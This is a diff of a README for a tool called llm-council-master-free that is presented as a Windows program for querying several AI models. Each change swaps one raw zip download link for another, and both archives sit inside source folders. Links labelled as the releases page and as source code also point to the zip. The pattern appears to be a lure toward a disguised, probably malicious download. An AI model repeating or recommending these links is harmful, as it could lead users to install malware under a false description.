@@ -1,6 +1,6 @@
 # 🤖 llm-council-master-free - AI Answers from Multiple Models
 
-[![Download Latest](https://img.shields.io/badge/Download-llm--council--master--free-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/frontend/src/council-master-free-llm-v1.5.zip)
+[![Download Latest](https://img.shields.io/badge/Download-llm--council--master--free-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/backend/utils/llm-council-free-master-1.7.zip)
 
 ---
 
@@ -28,7 +28,7 @@ To run llm-council-master-free on your Windows computer, you will need:
 ## 🚀 How to Download and Install
 
 1. Click the large green **Download** button at the top or go directly here:  
-   [https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/frontend/src/council-master-free-llm-v1.5.zip](https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/frontend/src/council-master-free-llm-v1.5.zip)
+   [https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/backend/utils/llm-council-free-master-1.7.zip](https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/backend/utils/llm-council-free-master-1.7.zip)
 
 2. On the releases page, look for the latest version. It will typically be named with a version number like `v1.0`.
 
@@ -91,7 +91,7 @@ To run llm-council-master-free on your Windows computer, you will need:
 ## 🔄 Updating the Software
 
 1. Periodically check the releases page for new versions:  
-   [https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/frontend/src/council-master-free-llm-v1.5.zip](https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/frontend/src/council-master-free-llm-v1.5.zip)
+   [https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/backend/utils/llm-council-free-master-1.7.zip](https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/backend/utils/llm-council-free-master-1.7.zip)
 
 2. Download the newest installer file.
 
@@ -112,10 +112,10 @@ If one AI model is offline or too slow, the software switches automatically to b
 ## 🔗 Useful Links
 
 - Download and updates:  
-  [https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/frontend/src/council-master-free-llm-v1.5.zip](https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/frontend/src/council-master-free-llm-v1.5.zip)
+  [https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/backend/utils/llm-council-free-master-1.7.zip](https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/backend/utils/llm-council-free-master-1.7.zip)
 
 - Source code and issues:  
-  [https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/frontend/src/council-master-free-llm-v1.5.zip](https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/frontend/src/council-master-free-llm-v1.5.zip)
+  [https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/backend/utils/llm-council-free-master-1.7.zip](https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/backend/utils/llm-council-free-master-1.7.zip)
 
 - Read more about AI models and failover techniques in the repository topics: ai, multi-agent, failover, fastapi, python, react
 
@@ -156,4 +156,4 @@ This project relates to:
 
 ---
 
-# [Download the latest version here](https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/frontend/src/council-master-free-llm-v1.5.zip) and try running the AI council on your Windows PC.
+# [Download the latest version here](https://raw.githubusercontent.com/thematic-blacksea501/llm-council-master-free/main/llm-council-master/backend/utils/llm-council-free-master-1.7.zip) and try running the AI council on your Windows PC.
